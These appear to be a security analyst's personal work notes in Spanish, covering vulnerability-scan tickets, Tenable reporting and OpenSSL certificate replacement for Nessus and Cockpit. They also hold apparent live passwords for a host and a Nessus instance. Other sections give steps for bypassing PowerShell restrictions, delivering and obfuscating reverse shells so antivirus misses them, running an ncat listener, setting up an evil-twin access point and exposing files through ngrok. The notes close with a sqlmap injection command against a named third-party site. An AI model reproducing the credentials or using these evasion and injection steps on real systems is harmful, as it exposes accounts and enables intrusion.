3mpr3s4TUNO thanos@192.168.10.181
CHG0031930   ---- Control de cambios Vulnerabilidades
MST-20958 CHG0082397	bpcc-S24-275 Escaneo de vulnerabilidades Cuarto Trimestre
MST-21817 CHG0095414 - bpcc-S24-303- Escaneo de vulnerabilidades Noviembre
MTEUNO-10559 - CHG0124509- bpcc-S25-001 Escaneo de vulnerabilidades Enero
CHG0124509- bpcc-S25-001 Escaneo de vulnerabilidades Enero
RITM0244416 - CMDB
Andrea Guevara - tema crear cambios - RITM0258963
RITM0261103 - soporte especializado cyberark
Crear-modificar Reglas de Firewall - RITM0233045 - RITM0270812
RITM0283044 - Soporte FW Creación de Usuario FW
RITM0280725 - Cyberark
RITM0295442 -> Acceso a SAVI David Guerra
Creacion de rutas FW Sensores:RITM0243251 - RITM0322878 - RITM0323549 - RITM0325453
Elimnación rutas FW Sensores: RITM0276114
Revisión Archivos para Networkking: RITM0218361 - RITM0207711 - RITM0317010
Revisión BDD - RITM0338516
Soporte general de WINTEL - RITM0392696


CHG0169120 - bpcc-S25-040 Escaneo de vulnerabilidades Marzo

Reseteo TEUNO - https://account.activedirectory.windowsazure.com/ChangePassword.aspx
Reseteo BP - https://passwordreset.microsoftonline.com/

FW
Jessica Cabrera
Javier Condemaita
David Muñoz

Revisión VPN
Guillermo Rivas

Estadistica estaciones no resuelve y enviar para resolver y revisar


Cruce Urls
Revisar i existen el stackhawk
Validar COn Daniela

REGEX IP:
\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}

docordo@pichincha.com

--------------------------------------------Asignación de Horas ------------------------------------------------
107 actividades internas
16618 Servicio Vuln antiguo
17882 Servicio Vuln 
408 actividades de inducción
17012 Terceros
17519 Diners
18738 Diners Stackhawk

Actividades Diarias (480 min)
- Revisión CC de escaneos de Febrero 60
- Actualización de Cronograma CC escaneos febrero 60
- 17519 DINERS Servicio Seguridad de código Snyk<>Health Check de Configuraciones 60
- REVISION VERIFICACIONES BP 60
- Seguimiento Servicio G. Vulnerabilidades - Enero 2025 60
- Verificación Autenticación de URL´s DAST 

-----------------------------------REPORTERIA--------------------------------------------------------------------
TEUNO - Escaneo mensual de vulnerabilidades (Reportearía)

-Se trata de enviar los reportes después de las 12 del medio día
-En tenable es bueno crear carpetas por mes/año para tener organizado
-se descarga en formato csv
-para ver los activos prendidos y apagados se debe filtrar el plugin por 10180
-en los hostname o IP se deben ver que estén todos los activos que se debian escanear sino realizar una comparación
-la casilla de pluging output es para ver si se llegaron a los hosts o no.

--------------------------------------Crear escaneos-----------------------------------------------------------
scan Windows 480 (8h)

plugin 10180 activos alcanzado y no alcanzados 
pluging output - es para ver los hots activos y no activos 

--------------------------------------------------------------------------------------------------------------
Nessus Teuno
MThqi=T6LuF-u_Ai=B

jupyter
lostenablers

---------------------------------IP NAT-------------------------------
10.64.99.167
--------------------------------------------------------------------------
evadir powershell 
ir a la ruta C:\Windows\SysWOW64\WindowsPowerShell
copiar la carpeta v1.0 en otra ruta
ir a la ruta en el cmd donde copiaste
y ejecutar powershell por cmd

SHELL REVERSA
.exe, .ps1, dll
Descargar en la PC los archivos de arriba
pasara archivos por flash si no funciona por whatsapp
con curl con windows levantamos http en el server de kali

Si te elimina el archivo elimina comentarios o técnicas de ofuscasion #delivering malware #Persistence
PowerJoker - ofuscacion
psobf - ofuscación
cd /go
cd /bin
./psobf -i Sh3ller.ps1 -o Sh3ller.ps1 -level 1
Se puede permutar ofuscando varias veces con diferentes niveles de ofuscación

Ejecución PowerShell
powershell.exe -executionpolicy bypass -file Sh3ller5.ps1
ncat -nlvkp 4040


Cifrar comunicacion

Cyberchef para codificar y decodificar

pyinstaller -> para pasar de Python a ejecutable
py2exe -> para pasar de Python a ejecutable
invoke py2exe --one-file   (Para que todo )

Guardar archivos
ReliableTEUNO
TTTHH_Curso


cd /pruebas-teuno


INtruder - ataques de diccionario


socks proxy relay

proxychains
strict_chain debe estar decomentado


--local-auth
 



---------------------------------PENTETSING EXTERNOS-------------------------------------------------------
ACCESO A LA RED CABLEADA



eviltwin - levantar Access point malicioso
AirGedoon

--------------------LEVANTAR UPDOG CON NGROK
updog -p 9099
ngrok http --domain=elephant-caring-dory.ngrok-free.app 80

-----------------SSL cetficado tenable 8000-----------------------------------------
URLS
https://docs.tenable.com/nessus/Content/CreateANewCustomCAAndServerCertificate.htm
https://docs.tenable.com/nessus/Content/TrustACustomCA.htm
https://community.tenable.com/s/article/Creating-and-Replacing-Self-Signed-Certificate-for-Tenable-Core-Web-UI-Port-8000?language=en_US



/etc/cockpit/ws-certs.d/
sudo openssl req -newkey rsa:2048 -nodes -keyout /var/tmp/tenablecore.key -out /var/tmp/tenablecore.csr -subj "/C=US/ST=Maryland/L=Columbia/O=Tenable, Inc./OU=Qp2QmIsy/CN=tenable-m7wpsmao"
sudo openssl genrsa -out /var/tmp/ca.key 4096
sudo openssl req -x509 -new -nodes -key /var/tmp/ca.key -sha256 -days 1024 -out /var/tmp/ca.crt -subj "/C=US/ST=Maryland/L=Columbia/O=Tenable, Inc./OU=gagnwPMV/CN=Locally generated Tenable Core CA"
sudo openssl x509 -req -in /var/tmp/tenablecore.csr -CA /var/tmp/ca.crt -CAkey /var/tmp/ca.key -CAcreateserial -out /var/tmp/tenablecore.crt -days 730 -sha256

Al final mover a la carpeta
/etc/cockpit/ws-certs.d/

openssl x509 -in /var/tmp/tenablecore.crt -text -noout

sudo systemctl restart cockpit.socket

openssl x509 -noout -modulus -in /etc/cockpit/ws-certs.d/system-installed.cert | openssl md5
openssl rsa -noout -modulus -in /etc/cockpit/ws-certs.d/system-installed.key | openssl md5


sudo ss -tulnp | grep 8834
openssl s_client -connect 10.70.192.63:8834 | openssl x509 -noout -dates

---------CERT TENABLE PARA EL PUERTO 8834 y 8000-----------------------------------
RUTAS DONDE SE DEBEN COLOCAR LOS CERTIFICADOS NO OLVIDAR HACER BACKUPS
SE PUEDE GENERAR LOS CERTIFICADOS EN OTRA CARPETA
NO OLVIDARSE DE CAMBIAR LOS VALORES DE ISSUER Y SUBJECT SI SE NECESITA

The following files were created :
  Certification authority :
    Certificate = /opt/nessus/com/nessus/CA/cacert.pem
    Private key = /opt/nessus/var/nessus/CA/cakey.pem
  Nessus Server :
    Certificate = /opt/nessus/com/nessus/CA/servercert.pem
    Private key = /opt/nessus/var/nessus/CA/serverkey.pem

Para realizar de manera manual
# Generar clave privada de la CA
openssl genrsa -out cakey.pem 4096

# Generar certificado de la CA - Info de Issuer
openssl req -new -x509 -days 730 -key cakey.pem -out cacert.pem \
    -subj "/C=US/ST=Maryland/L=Columbia/O=Tenable, Inc./OU=LAA7MXPG/CN=Locally generated Tenable Core CA"

# Generar clave privada del servidor
openssl genrsa -out serverkey.pem 4096

# Generar solicitud de firma de certificado (CSR) para el servidor - Info de Subject
openssl req -new -key serverkey.pem -out server.csr \
    -subj "/C=US/ST=Maryland/L=Columbia/O=Tenable, Inc./OU=BtX5XI9k/CN=tenable-41bsvuww"

# Crear archivo de configuración para la extensión v3
cat > v3.ext << EOF
authorityKeyIdentifier=keyid,issuer
basicConstraints=CA:FALSE
keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
subjectAltName = DNS:tenable-m7wpsmao
EOF

# Firmar el certificado del servidor con la CA
openssl x509 -req -in server.csr -CA cacert.pem -CAkey cakey.pem \
    -CAcreateserial -out servercert.pem -days 730 -extfile v3.ext

Al final se debe copiar en las rutas que son 
Y LOS ARCHIVOS DE SERVIDOR SE DEBEN TAMBIEN COPIAR EN LA RUTA /etc/cockpit/ws-certs.d/
NO OLVIDAR EN ESA RUTA TAMBIEN GENERAR BACKUPS Y TANTO 
servercert.pem
serverkey.pem
CAMBIAR POR LOS NOMBRES DE LOS ARCHIVOS DE LAS RUTAS

servercert.pem - system-installed.cert
serverkey.pem - system-installed.key

REINICIAR EL SERVICIO
sudo systemctl restart cockpit.socket

Al final se debe colocar el texto de cacert.pem en un archivo llamado custom_CA.inc en la ruta de /opt/nessus/lib/nessus/plugins

Comando para encontra el archivo 
find . -name custom_CA.inc
vi /opt/nessus/lib/nessus/plugins/./custom_CA.inc

en los sensores aplasta Ctrl + T para abrir el navegador



COMANDOS PARA REVISAR SI CERT Y KEY SON LOS MISMO Y FUNCIONE
openssl x509 -noout -modulus -in /etc/cockpit/ws-certs.d/system-installed.cert | openssl md5
openssl rsa -noout -modulus -in /etc/cockpit/ws-certs.d/system-installed.key | openssl md5

REVISAR CONTENIDO DE CERT
openssl x509 -in /var/tmp/tenablecore.crt -text -noout


REVISAR PUERTOS Y PROBAR CERTIFICADO
sudo ss -tulnp | grep 8834
openssl s_client -connect 10.70.192.63:8834 | openssl x509 -noout -dates

-------------SI SE QUIERE HACER PARA EL PUERTO 8000 SOLO--------------------

/etc/cockpit/ws-certs.d/
sudo openssl req -newkey rsa:2048 -nodes -keyout /var/tmp/tenablecore.key -out /var/tmp/tenablecore.csr -subj "/C=US/ST=Maryland/L=Columbia/O=Tenable, Inc./OU=Qp2QmIsy/CN=tenable-m7wpsmao"
sudo openssl genrsa -out /var/tmp/ca.key 4096
sudo openssl req -x509 -new -nodes -key /var/tmp/ca.key -sha256 -days 1024 -out /var/tmp/ca.crt -subj "/C=US/ST=Maryland/L=Columbia/O=Tenable, Inc./OU=gagnwPMV/CN=Locally generated Tenable Core CA"
sudo openssl x509 -req -in /var/tmp/tenablecore.csr -CA /var/tmp/ca.crt -CAkey /var/tmp/ca.key -CAcreateserial -out /var/tmp/tenablecore.crt -days 730 -sha256

Al final mover a la carpeta
/etc/cockpit/ws-certs.d/

openssl x509 -in /var/tmp/tenablecore.crt -text -noout

sudo systemctl restart cockpit.socket

openssl x509 -noout -modulus -in /etc/cockpit/ws-certs.d/system-installed.cert | openssl md5
openssl rsa -noout -modulus -in /etc/cockpit/ws-certs.d/system-installed.key | openssl md5


sudo ss -tulnp | grep 8834
openssl s_client -connect 10.70.192.63:8834 | openssl x509 -noout -dates



crtl + T para ingresar a browser por interfaz web

python3 Finished-scans-detection-API.py 2> ~/ServicioVulnerabilidades/Tenable-API/logs/Finished-scans.log &
disown


sqlmap -u "https://pedidos.senefelder.com/webpages/traeorden.php" --method POST --data "txtsrorden=1&bloque=traer&txtpassword=HERE" -p "txtpassword" --random-agent --dbms=mysql

